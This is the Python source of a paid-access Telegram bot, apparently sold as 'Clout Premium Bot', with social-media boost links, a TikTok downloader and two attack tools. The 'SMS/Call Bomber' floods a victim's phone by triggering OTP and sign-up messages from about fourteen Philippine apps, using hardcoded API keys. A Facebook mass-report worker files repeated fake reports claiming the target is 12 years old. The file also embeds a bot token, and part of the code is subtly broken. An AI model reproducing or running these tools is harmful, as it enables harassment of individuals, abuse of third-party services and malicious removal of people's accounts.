import asyncio
import json
import logging
import os
import random
import string
import time
import io
import hashlib
import re
from pathlib import Path
from typing import Optional, Dict, Any
from dataclasses import dataclass, asdict
from datetime import datetime
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import requests
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8628435205:AAGjeWiQduB6c2S6YSW7BXEQP1bP2VedMeY")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5728569894"))
ADMIN_IDS = {ADMIN_ID}

STATE_DIR = Path("/app/data")
try:
    STATE_DIR.mkdir(parents=True, exist_ok=True)
except PermissionError:
    STATE_DIR = Path("/tmp/data")
    STATE_DIR.mkdir(parents=True, exist_ok=True)

USERS_FILE = STATE_DIR / "users.json"
KEYS_FILE = STATE_DIR / "keys.json"
SETTINGS_FILE = STATE_DIR / "settings.json"

TIKTOK_API = "https://ceddsrestapi.vercel.app/downloader/tikdl"
FB_REPORT_URL = "https://mbasic.facebook.com/help/contact/209046679279097"
FB_SUBMIT_URL = "https://mbasic.facebook.com/a/help/contact_us/"

@dataclass
class User:
    user_id: int
    username: str = ""
    first_name: str = ""
    total_clicks: int = 0
    joined_at: float = 0.0
    is_banned: bool = False
    access_expires: float = 0.0
    current_key: str = ""
    total_keys_used: int = 0

@dataclass
class AccessKey:
    key: str
    duration_days: int = 0
    duration_hours: int = 0
    is_lifetime: bool = False
    created_at: float = 0.0
    expires_at: float = 0.0
    used_by: Optional[int] = None
    used_at: float = 0.0
    revoked: bool = False
    created_by: int = 0
    note: str = ""

@dataclass
class BotSettings:
    maintenance_mode: bool = False
    total_clicks: int = 0
    key_required: bool = True

USERS: Dict[int, User] = {}
KEYS: Dict[str, AccessKey] = {}
SETTINGS = BotSettings()

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("clout-boost-bot")

def load_state():
    global USERS, KEYS, SETTINGS

    if USERS_FILE.exists():
        try:
            with USERS_FILE.open("r") as f:
                data = json.load(f)
                for uid, user_data in data.items():
                    USERS[int(uid)] = User(**user_data)
            logger.info(f"Loaded {len(USERS)} users")
        except Exception as e:
            logger.error(f"Failed to load users: {e}")

    if KEYS_FILE.exists():
        try:
            with KEYS_FILE.open("r") as f:
                data = json.load(f)
                for key, key_data in data.items():
                    KEYS[key] = AccessKey(**key_data)
            logger.info(f"Loaded {len(KEYS)} keys")
        except Exception as e:
            logger.error(f"Failed to load keys: {e}")

    if SETTINGS_FILE.exists():
        try:
            with SETTINGS_FILE.open("r") as f:
                data = json.load(f)
                SETTINGS = BotSettings(**data)
        except Exception as e:
            logger.error(f"Failed to load settings: {e}")

    if ADMIN_ID and ADMIN_ID not in USERS:
        USERS[ADMIN_ID] = User(
            user_id=ADMIN_ID,
            username="admin",
            first_name="Admin",
            joined_at=time.time(),
            access_expires=float("inf"),
        )
        save_users()
        logger.info(f"Auto-registered admin {ADMIN_ID}")

def save_users():
    try:
        with USERS_FILE.open("w") as f:
            json.dump({str(k): asdict(v) for k, v in USERS.items()}, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save users: {e}")

def save_keys():
    try:
        with KEYS_FILE.open("w") as f:
            json.dump({k: asdict(v) for k, v in KEYS.items()}, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save keys: {e}")

def save_settings():
    try:
        with SETTINGS_FILE.open("w") as f:
            json.dump(asdict(SETTINGS), f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save settings: {e}")

def get_or_create_user(user_id: int, username: str = "", first_name: str = "") -> User:
    if user_id not in USERS:
        user = User(user_id=user_id, username=username, first_name=first_name, joined_at=time.time())
        USERS[user_id] = user
        save_users()
    else:
        user = USERS[user_id]
        if username and user.username != username:
            user.username = username
        if first_name and user.first_name != first_name:
            user.first_name = first_name
            save_users()
    return user

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_banned(user_id: int) -> bool:
    return user_id in USERS and USERS[user_id].is_banned

def has_access(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    if user_id not in USERS:
        return False
    user = USERS[user_id]
    if user.access_expires == float('inf'):
        return True
    if user.access_expires > 0 and time.time() < user.access_expires:
        return True
    return False

def get_access_status(user_id: int) -> str:
    if is_admin(user_id):
        return "ADMIN"
    if user_id not in USERS or not has_access(user_id):
        return "NO ACCESS"
    user = USERS[user_id]
    if user.access_expires == float('inf'):
        return "LIFETIME"
    remaining = user.access_expires - time.time()
    if remaining <= 0:
        return "EXPIRED"
    days = int(remaining // 86400)
    hours = int((remaining % 86400) // 3600)
    minutes = int((remaining % 3600) // 60)
    return f"{days}D {hours}H {minutes}M LEFT"

def generate_key() -> str:
    chars = string.ascii_uppercase + string.digits
    while True:
        key = "CLOUT-" + "".join(random.choices(chars, k=12))
        if key not in KEYS:
            return key

def create_access_key(duration_days: int = 0, duration_hours: int = 0, is_lifetime: bool = False, created_by: int = 0, note: str = "") -> AccessKey:
    key = generate_key()
    key_expires = time.time() + (30 * 86400)

    access_key = AccessKey(
        key=key,
        duration_days=duration_days,
        duration_hours=duration_hours,
        is_lifetime=is_lifetime,
        created_at=time.time(),
        expires_at=key_expires,
        created_by=created_by,
        note=note
    )
    KEYS[key] = access_key
    save_keys()
    return access_key

def redeem_key(user_id: int, key_string: str) -> Dict[str, Any]:
    key_string = key_string.strip().upper()

    if key_string not in KEYS:
        return {"success": False, "message": "× Invalid key. Please check and try again."}

    key = KEYS[key_string]

    if key.revoked:
        return {"success": False, "message": "× This key has been revoked."}

    if key.used_by is not None and key.used_by != user_id:
        return {"success": False, "message": "× This key has already been used by another user."}

    if time.time() > key.expires_at:
        return {"success": False, "message": "× This key has expired."}

    user = get_or_create_user(user_id)

    if key.is_lifetime:
        access_duration = float('inf')
    else:
        access_duration = (key.duration_days * 86400) + (key.duration_hours * 3600)

    current_time = time.time()

    if user.access_expires > current_time and user.access_expires != float('inf'):
        user.access_expires += access_duration
    else:
        user.access_expires = current_time + access_duration if access_duration != float('inf') else float('inf')

    key.used_by = user_id
    key.used_at = current_time
    user.current_key = key_string
    user.total_keys_used += 1

    save_users()
    save_keys()

    duration_msg = "LIFETIME ACCESS" if key.is_lifetime else f"{key.duration_days}D {key.duration_hours}H"

    return {
        "success": True,
        "message": (
            "╔════════════════════════════╗\n"
            "║   ACCESS ACTIVATED         ║\n"
            "╚════════════════════════════╝\n\n"
            f"▸ Duration : {duration_msg}\n"
            f"▸ Key      : {key_string}\n\n"
            "You can now access all services!"
        )
    }

def revoke_key(key_string: str) -> Dict[str, Any]:
    key_string = key_string.strip().upper()

    if key_string not in KEYS:
        return {"success": False, "message": "× Key not found."}

    key = KEYS[key_string]
    key.revoked = True

    if key.used_by is not None:
        user = USERS.get(key.used_by)
        if user:
            user.access_expires = 0
            user.current_key = ""
            save_users()

    save_keys()
    return {"success": True, "message": f"✓ Key {key_string} has been revoked."}

def main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    if is_admin(user_id):
        rows = [
            ["▸ Boost Services", "▸ TikTok Downloader"],
            ["▸ FB Report", "▸ SMS/Call Bomber"],
            ["▸ My Statistics", "▸ Help"],
            ["▸ Generate Key", "▸ Admin Panel"]
        ]
    elif has_access(user_id):
        rows = [
            ["▸ Boost Services", "▸ TikTok Downloader"],
            ["▸ FB Report", "▸ SMS/Call Bomber"],
            ["▸ My Statistics", "▸ Help"],
            ["▸ Redeem Key"]
        ]
    else:
        rows = [
            ["▸ Get Access", "▸ Help"],
            ["▸ My Statistics"]
        ]
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def boost_category_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("◈ TikTok Services", callback_data="category:tiktok")],
        [InlineKeyboardButton("◈ Instagram Services", callback_data="category:instagram")],
        [InlineKeyboardButton("◈ Facebook Services", callback_data="category:facebook")],
        [InlineKeyboardButton("« Main Menu", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def tiktok_services_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("◉ TikTok Views - Boost Now", url="https://zefame.com/en/free-tiktok-views")],
        [InlineKeyboardButton("◆ TikTok Followers - Boost Now", url="https://zefame.com/en/free-tiktok-followers")],
        [InlineKeyboardButton("♥ TikTok Likes - Boost Now", url="https://zefame.com/en/free-tiktok-likes")],
        [InlineKeyboardButton("↗ TikTok Shares - Boost Now", url="https://zefame.com/en/free-tiktok-shares")],
        [InlineKeyboardButton("★ TikTok Favorites - Boost Now", url="https://zefame.com/en/free-tiktok-saves")],
        [InlineKeyboardButton("« Back to Categories", callback_data="back_to_categories")],
    ]
    return InlineKeyboardMarkup(keyboard)

def instagram_services_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("◉ Instagram Views - Boost Now", url="https://zefame.com/en/free-instagram-views")],
        [InlineKeyboardButton("◆ Instagram Followers - Boost Now", url="https://zefame.com/en/free-instagram-followers")],
        [InlineKeyboardButton("◈ Instagram Story Views - Boost Now", url="https://zefame.com/en/free-instagram-story-views")],
        [InlineKeyboardButton("« Back to Categories", callback_data="back_to_categories")],
    ]
    return InlineKeyboardMarkup(keyboard)

def facebook_services_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("◆ Facebook Followers - Boost Now", url="https://zefame.com/en/free-facebook-followers")],
        [InlineKeyboardButton("◉ Facebook Video Views - Boost Now", url="https://zefame.com/en/free-facebook-views")],
        [InlineKeyboardButton("♥ Facebook Post Likes - Boost Now", url="https://zefame.com/en/free-facebook-post-likes")],
        [InlineKeyboardButton("« Back to Categories", callback_data="back_to_categories")],
    ]
    return InlineKeyboardMarkup(keyboard)

def admin_keyboard() -> ReplyKeyboardMarkup:
    rows = [
        ["▸ Generate Key", "▸ List Keys"],
        ["▸ Global Stats", "▸ Revoke Key"],
        ["▸ Broadcast", "▸ Settings"],
        ["▸ Main Menu"]
    ]
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def key_type_keyboard() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("∞ Lifetime Access", callback_data="keytype:lifetime")],
        [InlineKeyboardButton("◈ Custom Duration", callback_data="keytype:custom")],
        [InlineKeyboardButton("× Cancel", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    try:
        if isinstance(update, Update) and update.effective_user:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "⚠️ Bot Error\n"
                    f"User: {update.effective_user.id}\n"
                    f"Error: {type(context.error).__name__}: {context.error}"
                ),
            )
    except Exception:
        pass

async def download_tiktok_video(update: Update, context: ContextTypes.DEFAULT_TYPE, url: str):
    user = update.effective_user
    get_or_create_user(user.id, user.username or "", user.first_name or "")
    
    msg = await update.message.reply_text("▸ Fetching TikTok video... Please wait.")
    
    encoded_url = quote(url, safe='')
    api_url = f"{TIKTOK_API}?url={encoded_url}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=30) as response:
                if response.status != 200:
                    await msg.edit_text("× Failed to fetch video. API error.")
                    return
                
                data = await response.json()
                
                if "error" in data or "answer" not in data:
                    await msg.edit_text("× Failed to extract video. Invalid link or private video.")
                    return
                
                answer = data.get("answer", {})
                video_url = answer.get("downloadLink")
                author = answer.get("author", "Unknown")
                description = answer.get("description", "No description")
                likes = answer.get("likes", "0")
                comments = answer.get("comments", "0")
                
                if not video_url:
                    await msg.edit_text("× Video URL not found in response.")
                    return
                
                await msg.edit_text("▸ Downloading video file...")
                
                async with session.get(video_url, timeout=60) as video_resp:
                    if video_resp.status != 200:
                        await msg.edit_text("× Failed to download video file from TikTok CDN.")
                        return
                    
                    video_bytes = await video_resp.read()
                
                caption = (
                    f"◈ TikTok Video Downloaded\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"▸ Author : {author}\n"
                    f"▸ Likes  : {likes}\n"
                    f"▸ Comments: {comments}\n\n"
                    f"▸ Description:\n{description}"
                )
                
                await msg.edit_text("▸ Uploading video to Telegram...")
                
                video_file = io.BytesIO(video_bytes)
                video_file.name = "tiktok_video.mp4"
                
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption=caption,
                    supports_streaming=True,
                    read_timeout=120,
                    write_timeout=120
                )
                
                await msg.delete()
                
    except asyncio.TimeoutError:
        await msg.edit_text("× Request timed out. Please try again.")
    except Exception as e:
        logger.error(f"TikTok Download Error: {type(e).__name__}: {e}")
        await msg.edit_text("× An error occurred while processing the video.")

async def fb_report_worker(session: aiohttp.ClientSession, fb_id: str, fb_name: str, count: int, progress_msg, update: Update):
    email = f"whisper{random.randint(100, 999999999)}@gmail.com"
    
    get_headers = {
        "Host": "mbasic.facebook.com",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    success_count = 0
    failed_count = 0
    
    try:
        async with session.get(FB_REPORT_URL, headers=get_headers, timeout=30) as response:
            if response.status != 200:
                await progress_msg.edit_text(f"× Failed to load FB form. Status: {response.status}")
                return
            html = await response.text()
        
        try:
            jazoest = html.split('jazoest" value="')[1].split('"')[0]
            lsd = html.split('name="lsd" value="')[1].split('"')[0]
        except IndexError:
            await progress_msg.edit_text("× Failed to parse FB form tokens.")
            return
        
        post_headers = {
            "Host": "mbasic.facebook.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://mbasic.facebook.com",
            "Referer": "https://mbasic.facebook.com/help/contact/209046679279097",
        }
        
        for i in range(count):
            email = f"whisper{random.randint(100, 999999999)}@gmail.com"
            
            data = {
                "lsd": lsd,
                "jazoest": jazoest,
                "crt_url": f"https://www.facebook.com/profile.php?id={fb_id}",
                "crt_name": fb_name,
                "cf_age": "12 years",
                "Field255260417881843": "Close that account soon as possible please",
                "Field166040066844792": email,
                "source": "",
                "form_id": "209046679279097",
                "support_form_id": "209046679279097",
                "support_form_locale_id": "en_US",
                "support_form_hidden_fields": "[]",
                "support_form_fact_false_fields": "[]",
            }
            
            try:
                async with session.post(FB_SUBMIT_URL, data=data, headers=post_headers, timeout=30) as resp:
                    if resp.status == 200:
                        success_count += 1
                    else:
                        failed_count += 1
            except Exception:
                failed_count += 1
            
            if (i + 1) % 5 == 0 or (i + 1) == count:
                try:
                    await progress_msg.edit_text(
                        f"▸ Reporting... {i + 1}/{count}\n"
                        f"▸ Success: {success_count} | Failed: {failed_count}"
                    )
                except:
                    pass
            
            await asyncio.sleep(1.5)
        
        await progress_msg.edit_text(
            "╔════════════════════════════╗\n"
            "║      FB REPORT DONE        ║\n"
            "╚════════════════════════════╝\n\n"
            f"▸ Target ID   : {fb_id}\n"
            f"▸ Target Name : {fb_name}\n"
            f"▸ Total Sent  : {count}\n"
            f"▸ Success     : {success_count}\n"
            f"▸ Failed      : {failed_count}\n\n"
            "▸ Note: Reports are sent anonymously."
        )
        
        try:
            await context.bot.send_message(
                ADMIN_ID,
                f"◈ FB REPORT USED\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"▸ User   : {update.effective_user.first_name}\n"
                f"▸ ID     : {update.effective_user.id}\n"
                f"▸ Target : {fb_id} ({fb_name})\n"
                f"▸ Count  : {count}"
            )
        except:
            pass
        
    except Exception as e:
        logger.error(f"FB Report Error: {type(e).__name__}: {e}")
        await progress_msg.edit_text(f"× Error: {e}")

def format_phone(phone):
    clean = re.sub(r'\D', '', phone)
    if clean.startswith('63'):
        clean = clean[2:]
    if clean.startswith('0'):
        clean = clean[1:]
    return clean[:10]

def format_phone_display(phone):
    clean = format_phone(phone)
    return f"+63{clean}"

def random_string(length=10):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

def random_email():
    return f"{random_string(10)}@gmail.com"

def current_timestamp():
    return int(time.time())

def current_timestamp_ms():
    return int(time.time() * 1000)

def mwell_send(phone):
    try:
        formatted = format_phone(phone)
        timestamp = current_timestamp_ms()
        headers = {
            'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json',
            'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
            'x-app-version': '03.942.035', 'x-device-type': 'android', 'x-device-model': 'oneplus CPH2465',
            'x-timestamp': str(timestamp), 'x-request-id': random_string(16)
        }
        body = {'country': 'PH', 'phoneNumber': formatted, 'phoneNumberPrefix': '+63'}
        r = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def pexx_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'appversion': '3.0.14', 'x-msession-id': 'undefined', 'tid': random_string(11)}
        body = {'0': {'json': {'email': '', 'areaCode': '+63', 'phone': f'+63{formatted}', 'otpChannel': 'TG', 'otpUsage': 'REGISTRATION'}}}
        r = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def supportvip_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'boat': 'com.peso.loan.vip.credit', 'surface': '1.0.7', 'suggestion': 'd284bf47c4c1e4da4e3e6375498c6245', 'telescope': '', 'Content-Type': 'application/json; charset=utf-8'}
        body = {'invasion': formatted, 'persist': 'login', 'threshold': False}
        r = requests.post('https://supportviploan.com/pomelo/abortion/suffering/test', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def ezloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'okhttp/4.9.2', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'accept-language': 'en', 'imei': random_string(32), 'device': 'android', 'appversion': '2.0.4', 'appid': 'EZLOAN', 'businessid': 'EZLOAN'}
        body = {'businessId': 'EZLOAN', 'contactNumber': f'+63{formatted}'}
        r = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def xpressph_send(phone):
    try:
        formatted = format_phone(phone)
        timestamp = current_timestamp()
        headers = {'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        body = {'FirstName': f'User{timestamp}', 'LastName': 'Test', 'Email': f'user{timestamp}@gmail.com', 'Phone': f'+63{formatted}'}
        r = requests.post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def bistro_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36', 'Accept': 'application/json, text/plain, */*', 'x-requested-with': 'com.allcardtech.bistro'}
        r = requests.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}', headers=headers, timeout=8)
        return r.status_code == 200
    except:
        return False

def bayadcenter_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
        body = {'mobileNumber': f'+63{formatted}', 'emailAddress': random_email()}
        r = requests.post('https://api.online.bayad.com/api/sign-up/otp', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def supremeloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'okhttp/4.11.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'bill': '', 'syndrome': '1.1.3', 'throughout': 'com.supreme.money.loan', 'cute': 'd284bf47c4c1e4da4e3e6375498c6245', 'cure': '14.864864864864865', 'come': '121.05883328670785', 'Content-Type': 'application/json; charset=utf-8'}
        body = {'aide': 'd284bf47c4c1e4da4e3e6375498c6245', 'exactly': formatted, 'sick': False}
        r = requests.post('https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def pickupcoffee_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        body = {'mobile_number': f'+63{formatted}', 'login_method': 'mobile_number'}
        r = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def honeyloan_send(phone):
    try:
        formatted = format_phone(phone)
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        body = {'phone': formatted}
        r = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def kumuph_send(phone):
    try:
        formatted = format_phone(phone)
        encrypt_timestamp = current_timestamp()
        encrypt_rnd_string = random_string(32)
        secret = "kumu_secret_2024"
        sign_data = f"{encrypt_timestamp}{encrypt_rnd_string}{formatted}{secret}"
        encrypt_signature = hashlib.sha256(sign_data.encode()).hexdigest()
        headers = {'User-Agent': 'okhttp/5.0.0-alpha.14', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'Device-Type': 'android', 'Device-Id': random_string(16)}
        body = {'country_code': '+63', 'encrypt_rnd_string': encrypt_rnd_string, 'cellphone': formatted, 'encrypt_signature': encrypt_signature, 'encrypt_timestamp': encrypt_timestamp}
        r = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def s5com_send(phone):
    try:
        formatted = f"+63{format_phone(phone)}"
        headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'}
        body = f'phone_number={formatted}'
        r = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def cashalo_send(phone):
    try:
        formatted = format_phone(phone)
        device_identifier = random_string(16)
        headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==', 'x-device-identifier': device_identifier, 'x-device-type': '1'}
        body = {'phone_number': formatted, 'device_identifier': device_identifier, 'device_type': 1}
        r = requests.post('https://api.cashaloapp.com/access/register', headers=headers, json=body, timeout=8)
        return r.status_code == 200
    except:
        return False

def mocasa_voice_send(phone):
    try:
        formatted = format_phone(phone)
        if not formatted.startswith('9'):
            return False
        device_id = "0536db2db2b341e483de881c94e0e203"
        payload = json.dumps({"country": "Philippines", "appVersion": 206, "appPackageName": "com.mocasa.ph", "mobile": formatted, "channel": "APP", "systemType": 0, "myDeviceId": device_id, "appCode": "mocasa", "sendChannel": "voice", "verifyType": 1, "token": ""})
        headers = {'User-Agent': 'okhttp/4.8.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
        r = requests.post('https://service.mocasa.com/app/v1/login/sendVerifyCode', headers=headers, data=payload, timeout=15)
        if r.status_code == 200:
            resp = r.json()
            return resp.get('code') == 0
        return False
    except:
        return False

SMS_SERVICES = [
    ("MWELL", mwell_send), ("PEXX", pexx_send), ("SUPPORT VIP", supportvip_send),
    ("EZLOAN", ezloan_send), ("XPRESS PH", xpressph_send), ("BISTRO", bistro_send),
    ("BAYAD CENTER", bayadcenter_send), ("SUPREME LOAN", supremeloan_send),
    ("PICKUP COFFEE", pickupcoffee_send), ("HONEY LOAN", honeyloan_send),
    ("KUMU PH", kumuph_send), ("S5.COM", s5com_send), ("CASHALO", cashalo_send),
]
VOICE_SERVICES = [("MOCASA VOICE", mocasa_voice_send)]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_banned(user.id):
        await update.message.reply_text("× You are banned from this bot.")
        return
    get_or_create_user(user.id, user.username or "", user.first_name or "")
    context.user_data.clear()
    access_status = get_access_status(user.id)
    welcome_text = (
        "╔════════════════════════════╗\n║   CLOUT PREMIUM BOT        ║\n╚════════════════════════════╝\n\n"
        f"▸ Welcome, {user.first_name}!\n\n━━━━━━━━━━━━━━━━━━━━\n◈ Access : {access_status}\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "▸ AVAILABLE SERVICES\n  ◈ Social Media Boosting\n  ◈ TikTok Video Downloader\n  ◈ Facebook Mass Report\n  ◈ SMS/Call Bomber\n\n"
    )
    if not has_access(user.id) and not is_admin(user.id):
        welcome_text += "━━━━━━━━━━━━━━━━━━━━\n▸ GET ACCESS\n  Contact admin to purchase.\n\n▸ PRICING\n  ◈ 3 Days    : $1.99\n  ◈ 7 Days    : $3.99\n  ◈ 30 Days   : $9.99\n  ◈ Lifetime  : $29.99\n\nUse '▸ Get Access' to redeem!"
    else:
        welcome_text += "━━━━━━━━━━━━━━━━━━━━\n▸ Use menu buttons below to start!"
    await update.message.reply_text(welcome_text, reply_markup=main_keyboard(user.id))

async def whoami(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"▸ Your ID      : {user.id}\n▸ Username     : @{user.username or 'none'}\n▸ First Name   : {user.first_name}\n"
        f"▸ Is Admin?    : {'YES ✅' if is_admin(user.id) else 'NO ❌'}\n▸ Has Access?  : {'YES ✅' if has_access(user.id) else 'NO ❌'}"
    )

async def boost_services(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_banned(user.id):
        await update.message.reply_text("× You are banned from this bot.")
        return
    if SETTINGS.maintenance_mode and not is_admin(user.id):
        await update.message.reply_text("× Bot is under maintenance. Try again later.")
        return
    if not has_access(user.id):
        await update.message.reply_text("× You need access to use boost services.\n\n▸ Get your key from admin\n▸ Use '▸ Get Access' to redeem!", reply_markup=main_keyboard(user.id))
        return
    user_obj = get_or_create_user(user.id, user.username or "", user.first_name or "")
    user_obj.total_clicks += 1
    SETTINGS.total_clicks += 1
    save_users()
    save_settings()
    context.user_data.clear()
    await update.message.reply_text("╔════════════════════════════╗\n║    BOOST SERVICES          ║\n╚════════════════════════════╝\n\n▸ Select a platform :", reply_markup=boost_category_keyboard())

async def handle_boost_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    try:
        if data == "main_menu":
            await query.edit_message_text("▸ Main Menu :", reply_markup=main_keyboard(query.from_user.id))
            return
        if data == "back_to_categories":
            await query.edit_message_text("╔════════════════════════════╗\n║    BOOST SERVICES          ║\n╚════════════════════════════╝\n\n▸ Select a platform :", reply_markup=boost_category_keyboard())
            return
        if data.startswith("category:"):
            category = data.split(":")[1]
            if category == "tiktok":
                text = "╔════════════════════════════╗\n║    TIKTOK SERVICES         ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                kb = tiktok_services_keyboard()
            elif category == "instagram":
                text = "╔════════════════════════════╗\n║   INSTAGRAM SERVICES       ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                kb = instagram_services_keyboard()
            elif category == "facebook":
                text = "╔════════════════════════════╗\n║    FACEBOOK SERVICES       ║\n╚════════════════════════════╝\n\n▸ Click a service to boost :"
                kb = facebook_services_keyboard()
            else:
                return
            await query.edit_message_text(text, reply_markup=kb)
            return
    except Exception as e:
        logger.error(f"BOOST OUTER ERROR: {type(e).__name__}: {e}")

async def get_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if has_access(user.id):
        access_status = get_access_status(user.id)
        await update.message.reply_text(f"✓ You already have access!\n\n◈ Status : {access_status}")
        return
    context.user_data.clear()
    context.user_data['awaiting'] = 'key'
    await update.message.reply_text("╔════════════════════════════╗\n║     REDEEM ACCESS KEY      ║\n╚════════════════════════════╝\n\n▸ Enter your access key below.\n\n▸ Format : CLOUT-XXXXXXXXXXXX\n\nType /cancel to go back.")

async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_string = update.message.text.strip()
    context.user_data.pop('awaiting', None)
    result = redeem_key(update.effective_user.id, key_string)
    if result['success']:
        await update.message.reply_text(result['message'], reply_markup=main_keyboard(update.effective_user.id))
        user = update.effective_user
        try:
            await context.bot.send_message(ADMIN_ID, f"◈ KEY REDEEMED\n━━━━━━━━━━━━━━━━━━━━\n\n▸ User : {user.first_name}\n▸ ID   : {user.id}\n▸ Key  : {key_string}")
        except:
            pass
    else:
        await update.message.reply_text(result['message'])
        context.user_data['awaiting'] = 'key'

